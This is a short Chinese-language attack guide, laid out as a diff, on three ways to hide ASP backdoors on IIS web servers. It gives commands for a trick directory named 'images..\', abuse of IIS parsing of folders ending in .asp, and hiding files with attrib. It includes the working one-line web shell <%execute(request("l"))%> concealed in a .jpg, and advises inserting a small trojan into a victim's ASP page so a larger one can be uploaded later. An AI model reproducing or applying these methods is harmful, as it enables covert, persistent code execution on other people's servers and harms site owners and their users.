@@ -1,0 +1,16 @@
+ 隐藏ASP后门的三种方法   
+
+1、建立非标准目录：mkdir images..\
+拷贝ASP木马至目录：copy c:\inetpub\wwwroot\news.asp c:\inetpub\wwwroot\images..\news.asp
+通过web访问ASP木马：http://ip/images../news.asp?action=login
+如何删除非标准目录：rmdir images..\ /s
+2、Windows中的IIS会对以.asp结尾的目录中的文件进行解析，以达到我们隐藏自己的网页后门的目的:
+mkdir programme.asp
+新建1.txt文件内容：<!--#include file=”12.jpg”-->
+新建12.jpg文件内容：<%execute(request("l"))%> 或使用GIF与ASP合并后的文件
+attrib +H +S programme.asp
+通过web访问ASP一句话木马：http://ip/images/programme.asp/1.txt
+3.最为简单,也最为有效了,就是直接在对方的一个代码多的ASP页面中插入小马的代码.呵呵.随时要用随时上传大马.
+
+
+
